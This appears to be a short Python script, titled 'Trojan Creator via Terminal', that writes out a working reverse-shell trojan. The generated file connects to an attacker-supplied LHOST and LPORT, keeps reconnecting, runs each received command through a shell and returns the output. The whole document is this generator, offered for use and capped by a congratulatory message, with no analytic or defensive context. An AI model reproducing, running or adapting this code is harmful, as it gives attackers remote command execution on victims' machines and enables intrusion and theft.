'''Trojan Creator via Terminal'''
import sys

if __name__ == "__main__":
    print("Hello, use this program for create a simple trojan")
    print("This Arguments are mandatory")
    print("1ยบ Arg --> Arquive Name")
    print("2ยบ Arg --> LHOST, you can use a url to receive the connection")
    print("3ยบ Arg --> LPORT")

    if len(sys.argv) >= 2:
        if len(sys.argv) >= 3:
            if len(sys.argv) >= 4:
                with open(sys.argv[1]+".py", "w") as trojan:
                    trojan.write("import socket\n"
                                 "import subprocess\n"
                                 "import time\n"
                                 "import threading\n"
                                 "import sys\n"
                                 "IP = '{}'\n"
                                 "PORT = {}\n"
                                 "CONNETION = False\n"
                                 "def connect(IP, PORT):\n"
                                 "  try:\n"
                                 "      client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                                 "      client.connect((IP, PORT))\n"
                                 "      return client\n"
                                 "  except Exception as error:\n"
                                 "      pass\n"
                                 "def conectiontest(client):\n"
                                 "  try:\n"
                                 "      client.send(b'')\n"
                                 "  except:\n"
                                 "      time.sleep(5)\n"
                                 "      connect(IP, PORT)\n"
                                 "  else:\n"
                                 "      return\n"
                                 "def conection():\n"
                                 "      while True:\n"
                                 "          client = connect(IP, PORT)\n"
                                 "          if client:\n"
                                 "              listen(client)\n"
                                 "          else:\n"
                                 "              time.sleep(3) \n"
                                 "def cmd(client, data):\n"
                                 "  try:\n"
                                 r"      client.send(b'\n')"
                                 "\n"
                                 "      proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)\n"
                                 "      output = proc.stdout.read()\n"
                                 "      if output:\n"
                                 r"          client.send(output + b'\n')"
                                 "\n"
                                 "      erroutput = proc.stderr.read()\n"
                                 "      if erroutput:\n"
                                 "          client.send(erroutput)\n"
                                 "  except BrokenPipeError:\n"
                                 "      pass\n"
                                 "  except Exception as error:\n"
                                 "      pass\n"
                                 "def listen(client):\n"
                                 "  try:\n"
                                 "      while True:\n"
                                 "          data = client.recv(1024).decode().strip()\n"
                                 "          if data == '/exit':\n"
                                 "              client.close()\n"
                                 "          else:\n"
                                 "              client.send(b'')\n"
                                 "              threading.Thread(target=cmd, args=(client, data)).start()\n"
                                 "  except BrokenPipeError:\n"
                                 "      time.sleep(5)\n"
                                 "      pass\n"
                                 "  except Exception as error:\n"
                                 "      client.close()\n"
                                 "if __name__ == '__main__':\n"
                                 "  try:\n"
                                 "      conection()\n"
                                 "  except KeyboardInterrupt:\n"
                                 "      pass\n".format(str(sys.argv[2]), sys.argv[3]).strip())
                    print(">>>> Congratulation, now you have a Trojan :) <<<<")
    else:
        print(">>> No Args <<<")
